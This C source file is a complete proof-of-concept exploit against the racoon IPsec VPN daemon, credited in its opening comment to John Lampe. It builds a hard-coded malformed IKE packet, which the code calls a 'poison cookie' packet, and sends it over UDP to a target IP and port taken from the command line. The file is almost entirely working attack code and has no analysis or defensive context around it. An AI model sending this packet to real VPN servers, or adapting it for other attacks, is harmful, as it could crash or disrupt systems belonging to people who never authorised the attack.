/* John Lampe, flaw in racoon vpn */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <arpa/nameser.h>
#include <errno.h>




int main(int argc, char *argv[]) {
	struct sockaddr_in addr;
	int s, port;
	char *host = NULL;
        char big_foo[] =
"\xFF\x00\xFE\x01\xFD\x02\xFC\x03\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00"
"\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\xFF\xFF\xFF\xFF\xAA\xAA\x99\x88\x77\x66\x55\x44\x33\x22\x46"
"\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F"
"\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F"
"\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F"
"\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F"
"\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F"
"\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F\x4F";


	
	if (argc != 3) {
		fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
		exit(1);
	}

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stderr, "Port out of range (%d)\n", port);
		exit(1);
	}



	memset(&addr, 0, sizeof(addr));


	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}
        fprintf(stderr, "sending poison cookie packet to racoon\n");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(host);
	connect(s, (struct sockaddr *)&addr, sizeof(addr)); 
	write(s, big_foo, sizeof(big_foo) - 1 );
	close(s);
        fprintf(stderr, "done.\n");
	exit(EXIT_SUCCESS);
}

